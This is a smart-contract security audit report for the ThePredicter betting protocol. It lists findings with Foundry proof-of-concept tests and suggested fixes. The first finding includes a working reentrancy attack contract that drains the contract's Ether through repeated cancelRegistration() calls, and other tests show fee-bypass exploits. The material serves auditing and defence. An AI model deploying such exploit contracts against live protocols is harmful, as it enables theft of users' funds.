## Sending Ether before updating the contract's state in cancelRegistration() can cause a reentrancy attack, leading to significant fund losses.

### Relevant GitHub Links

https://github.com/Cyfrin/2024-07-the-predicter/blob/839bfa56fe0066e7f5610197a6b670c26a4c0879/src/ThePredicter.sol#L62

## Summary

In the Predicter protocol, players can register by paying an entrance fee set by the betting protocol organizer. After registration, players have the option to cancel their registration. Also, if the number of registered players reaches the maximum limit of 30, the player can also call the `cancelRegistration()` function to cancel their registration.
The current implementation has a vulnerability where Ether is sent to the player before updating the state, allowing attackers to exploit this and drain the protocol's funds through repeated registrations and cancellations.

## Vulnerability Details

In the ThePredicter contract, attacker can register as a player and call the `cancelRegistration()` function to cancel their registration, with the intention of re-entry it since the state is updated after the transfer of the ether.

## POC

### Contract

    // SPDX-License-Identifier: SEE LICENSE IN LICENSE
    pragma solidity 0.8.20;

    import {ThePredicter} from "../../src/ThePredicter.sol";
    import {Test, console} from "forge-std/Test.sol";

    contract ReentrancyAttack {
    address public owner;

    ThePredicter predicter;

    constructor(address _contractaddress) {
        predicter = ThePredicter(_contractaddress);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        predicter.register{value: amount}();

        predicter.cancelRegistration();
    }

    receive() external payable {
        if (address(predicter).balance > 0) {
            predicter.cancelRegistration();
        }
        (bool success, ) = payable(owner).call{value: address(this).balance}(
            ""
        );
        if (!success) revert("Failed Transaction");
    }

}

### Test

    function test_forReentrancy() public {

        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.warp(2);
        vm.startPrank(attacker);
        vm.deal((address(attackercontract)), 1 ether);
        attackercontract.attack(0.04 ether);
        vm.stopPrank();

        assertEq(attacker.balance, 1.04 ether);
    }

## Impact

The vulnerability in the "cancelRegistration()" function poses a high risk of reentrancy attacks. If exploited, an attacker could drain the contract's funds and manipulate its state, leading to financial losses and unintended behaviour within the contract.

## Tools Used

Manual Audit

## Recommendations

1. For the reentrancy, it is best practice always to apply the check->effect->interaction.

-- (bool success, ) = msg.sender.call{value: entranceFee}("");
-- playersStatus[msg.sender] = Status.Canceled;

++ playersStatus[msg.sender] = Status.Canceled;
++ (bool success, ) = msg.sender.call{value: entranceFee}("");

## The Time Constraint Check in makePrediction() Allows Betting at Thu Aug 15 2024 20:00:00 GMT+0000

## Summary

The `makePrediction()` function allows players to place bets on a specific game. According to the protocol's documentation, predictions can be made by any approved player until 19:00:00 UTC on the day of the match, which starts at 20:00:00 UTC. However, the current implementation of `makePrediction()` permits players to place bets even after 19:00:00 UTC, violating the protocol's rules and undermining the game's integrity.

## Vunerablity

According to the documentation, players are expected to place their bets on or before 19:00:00 UTC. However, due to an issue with the `if` statement check in `makePrediction()`, players are currently able to place bets after 19:00:00 UTC. This violates the protocol's rules and compromises the integrity of the game.

## POC

    function test_playersPreditAfterTheSpecifiedTime() public {
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();
        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();

        vm.startPrank(stranger);
        vm.warp(1723752000);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();
    }

## Impact

1. The ability to place bets after the cutoff time contradicts the documented rules, leading to inconsistencies and potential disputes.
2. Players and stakeholders may lose trust in the system if it doesn't adhere to its stated rules, potentially damaging the reputation of the protocol.
3. Allowing late bets undermines the fairness of the game, as players might exploit this loophole to make predictions based on last-minute information.

## Tools

Manual

## Recommedation

-- if (block.timestamp <= START_TIME + matchNumber \* 68400 - 68400)

++ if (
block.timestamp <= (START_TIME + matchNumber \* 68400 - 68400) - 3600
)

## No check on the Players Status can lead to pending player making prediction with no entrance fee

## Summary

The `makePrediction()` function allows players to place bets on a specific game, requiring them to pay a prediction fee beforehand. However, the current implementation lacks a check to verify the player's status before they can place a bet. As a result, a player could register and place a bet without being properly approved, which undermines the integrity of the betting process.

## Vunelrablity

The `makePrediction()` function has a serious vulnerability: a player can register without approval, place a prediction, and then withdraw their entrance fee without contributing any significant amount. This flaw undermines the integrity of the prediction system and allows players to exploit the protocol without properly participating.

## POC

    function test_playersWithPendingStatusCanPredict() public {
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );

        thePredicter.cancelRegistration();
        vm.stopPrank();

        assertEq(stranger.balance, 0.9999 ether);
    }

## Impact

Malicious players can exploit this vulnerability to drain the protocol by placing predictions without paying the entrance fee. They can register with a pending status, make a prediction, and then use the `cancelRegistration()` function to withdraw their entrance fee, effectively contributing nothing while still taking advantage of the system.

## Tools Used

Manual

## Recommedations

Add a require check on `makePrediction()`.  
require(playersStatus[msg.sender] == Status.Approved,"Not Allowed")

## The Public Visiblity of the setPrediction() will allow any player to set prediction without paying predition fee

## Summary

The `setPrediction` function is public, meaning it can be called by any player registered in the contract. This exposes a vulnerability, as attackers can bypass paying the prediction fee by exploiting this accessibility.

## Vulnerability Details

The `setPrediction` function is public, meaning it can be called by any player registered in the contract. This exposes a vulnerability, as attackers can bypass paying the prediction fee by exploiting this accessibility.

## POC

    function test_playersCanPreditWithoutPaying() public {
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();

        vm.startPrank(stranger);
        scoreBoard.setPrediction(stranger, 1, ScoreBoard.Result.Draw);
        vm.stopPrank();

        assertEq(stranger.balance, 0.96 ether);
    }

## Impact

This oversight can lead to a loss of funds and damage the overall integrity of the protocol. Allowing pending players to make predictions without paying the entrance fee undermines the system's fairness and reliability.

## Tools Used

Manual

## Recommedations

    function setPrediction(
        address player,
        uint256 matchNumber,
        Result result
    ) internal {}

## No Event Logging On Key Functions in the ThePredicter.sol

## Summary

Emitting events can facilitate tracking and enable external systems to react appropriately. This improves transparency and allows for real-time monitoring and response to critical actions within the contract.

## Vulnerability Details

Most of the key functions, such as `register()`, `cancelRegistration()`, `approvePlayer()`, and `makePrediction()`, lack event emissions. Adding events to these functions could significantly aid in tracking actions and reacting externally, enhancing transparency and monitoring capabilities.

## Impact

1. Difficult Debugging: Events provide a log of actions taken within the contract, which is crucial for debugging and auditing. The absence of events can complicate troubleshooting and identifying issues.

2. Limited External Reactions: External systems and dApps often rely on events to trigger actions or updates. Without events, these systems cannot react to changes in the contract, reducing interactivity and responsiveness.

## Tools Used

Manual

## Recommendations

Add events to key functions on the contracts.

## No Zero address check on setThePredicter() in ScoreBoard.sol

## Summary

## Vulnerability Details

The setThePredicter() function in ScoreBoard.sol lacks a check for a zero address, allowing the possibility of setting an invalid address as the predicter. This can lead to unintended consequences and potential vulnerabilities within the protocol.

## Impact

Without a zero address check, an invalid address can be assigned as the predictor, leading to erroneous behavior in the protocol.

## Tools Used

Manual

## Recommendations

require(\_thePredicter != address(0), "Invalid Address")
